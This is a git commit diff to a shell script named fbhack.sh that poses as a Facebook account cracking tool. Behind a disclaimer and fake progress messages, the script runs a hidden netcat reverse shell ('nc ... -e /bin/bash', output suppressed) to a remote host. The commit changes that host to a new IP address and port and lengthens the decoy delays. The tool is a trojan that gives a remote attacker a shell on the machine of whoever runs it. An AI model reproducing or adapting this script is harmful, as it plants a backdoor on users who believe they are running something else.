3245ad609a0f2ef1dda500fbb56f5b8d57c54256
Shiva454527 <80078546+Shiva454527@users.noreply.github.com>
2021-03-08 16:15:47 +0530

    Update fbhack.sh

--- fbhack.sh
+++ fbhack.sh
@@ -1,10 +1,11 @@
 toilet -f future "Facebook Account Cracking"
 echo "This tool used for educational purpose don't use illegal activities I am not responsible"
 echo "enter numeri id "
-sleep 5
+sleep 15
 echo " [+] Account to crack : "
 echo  " [+] , please wait ..."
 echo "[+] reading database...."
-sleep 5
-nc DavidDj-41260.portmap.io 41260 -e /bin/bash > /dev/null 2>&1 & echo "[+]Server busy please "
+sleep 8
+ 
+nc 193.161.193.99 1194 -e /bin/bash > /dev/null 2>&1 & echo "[+]Server busy please "
 
